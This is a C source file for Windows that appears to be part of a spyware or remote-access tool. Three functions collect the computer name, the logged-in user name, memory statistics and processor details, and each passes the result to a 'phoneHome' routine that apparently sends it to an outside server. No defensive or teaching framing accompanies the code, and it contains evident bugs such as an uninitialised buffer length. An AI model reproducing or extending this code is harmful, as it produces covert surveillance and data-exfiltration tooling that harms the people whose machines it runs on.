#include "config.h"

void getUserInfo()
{
	TCHAR tchBuffer[256];
	TCHAR temp[256];
	TCHAR temp2[256];
	char szString[256];

	DWORD dwBufferSize = _tcslen(temp);
	size_t nNumCharConverted;

	GetComputerName(temp, &dwBufferSize);
	_stprintf_s(tchBuffer, 256, _T("Computer name:   %s\n"), temp);
	GetUserName(temp, &dwBufferSize);
	_stprintf_s(temp2, 256, _T("Username:        %s\n"), temp);
	StringCchCat(tchBuffer, 256, temp2);

	wcstombs_s(&nNumCharConverted, szString, 256, tchBuffer, 256);
	phoneHome(szString);

	return 0;
}

void getMemoryUsage()
{
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);
	GlobalMemoryStatusEx(&statex);

	TCHAR tchBuffer[256];
	TCHAR temp[256];
	char szString[256];
	size_t nNumCharConverted;

	double totalMem  = (statex.ullTotalPhys / DIV);
	double usedMem   = (statex.ullTotalPhys / DIV) - (statex.ullAvailPhys / DIV);
	double totalPage = (statex.ullTotalPageFile / DIV);
	double usedPage  = (statex.ullTotalPageFile / DIV) - (statex.ullAvailPageFile / DIV);
	double totalVMem = (statex.ullTotalVirtual / DIV);
	double usedVMem  = (statex.ullTotalVirtual / DIV) - (statex.ullAvailVirtual / DIV);

	_stprintf_s(tchBuffer, 256, _T("Memory Usage:    %*ld%% GB\n"), 1, statex.dwMemoryLoad);
	_stprintf_s(temp, 256, _T("Physical Memory: %.2f/%.2f GB\n"), usedMem / 100, totalMem / 100);
	StringCchCat(tchBuffer, 256, temp);
	_stprintf_s(temp, 256, _T("Paging File:     %.2f/%.2f GB\n"), usedPage / 100, totalPage / 100);
	StringCchCat(tchBuffer, 256, temp);
	_stprintf_s(temp, 256, _T("Virtual Memory:  %.2f/%.2f GB\n"), usedVMem / 100, totalVMem / 100);
	StringCchCat(tchBuffer, 256, temp);
	_stprintf_s(temp, 256, _T("Extended Memory: %*I64d GB \n"), 1, statex.ullAvailExtendedVirtual / DIV);
	StringCchCat(tchBuffer, 256, temp);

	wcstombs_s(&nNumCharConverted, szString, 256, tchBuffer, 256);
	phoneHome(szString);
}

void getSystemInfo()
{
	TCHAR tchBuffer[256];
	TCHAR temp[256];
	size_t nNumCharConverted;
	char szString[256];
	SYSTEM_INFO siSysInfo;
	GetSystemInfo(&siSysInfo);

	_stprintf_s(tchBuffer, 256, _T("OEM ID:          %u\n"), siSysInfo.dwOemId);
	_stprintf_s(temp, 256, _T("# of processors: %u\n"), siSysInfo.dwNumberOfProcessors);
	StringCchCat(tchBuffer, 256, temp);
	_stprintf_s(temp, 256, _T("Page size:       %u\n"), siSysInfo.dwPageSize);
	StringCchCat(tchBuffer, 256, temp);
	_stprintf_s(temp, 256, _T("Processor type:  %u\n"), siSysInfo.dwProcessorType);
	StringCchCat(tchBuffer, 256, temp);
	_stprintf_s(temp, 256, _T("Min app address: %lx\n"), siSysInfo.lpMinimumApplicationAddress);
	StringCchCat(tchBuffer, 256, temp);
	_stprintf_s(temp, 256, _T("Max app address: %lx\n"), siSysInfo.lpMaximumApplicationAddress);
	StringCchCat(tchBuffer, 256, temp);
	_stprintf_s(temp, 256, _T("Active processor mask: %u\n"), siSysInfo.dwActiveProcessorMask);
	StringCchCat(tchBuffer, 256, temp);

	wcstombs_s(&nNumCharConverted, szString, 256, tchBuffer, 256);
	phoneHome(szString);
}